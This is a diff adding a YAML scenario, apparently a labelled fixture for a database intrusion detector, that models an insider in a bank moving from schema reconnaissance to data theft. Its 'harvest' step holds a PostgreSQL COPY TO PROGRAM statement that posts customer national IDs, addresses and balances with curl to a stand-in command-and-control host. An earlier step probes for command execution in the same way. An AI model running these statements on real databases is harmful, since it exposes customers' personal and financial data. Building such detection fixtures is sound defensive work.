@@ -1,0 +1,37 @@
+scenario_id: banking_lateral_move_0003
+family_id: banking_lateral_move_0003
+domain: banking
+time_of_day: '23:15'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: recon
+  role: teller
+  class: malicious
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 4.787054995116542
+  events:
+  - sql: SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'public'
+  - sql: SELECT COUNT(*) FROM customers WHERE branch_id = 'BR-063'
+  - step_id: probe
+    sql: COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'
+- session_label: harvest
+  role: teller
+  class: malicious
+  anchor: db
+  delay_after_previous_seconds: 13.627155724657865
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.1874282839278791
+  events:
+  - sql: SELECT national_id, address, full_name FROM customers
+  - sql: SELECT account_id, balance, customer_id FROM accounts WHERE balance > 197585
+  - step_id: exfil
+    sql: COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://c2.example.net/harvest -d @-'
+    connects_to:
+      ip: 198.51.100.77
+      port: 443
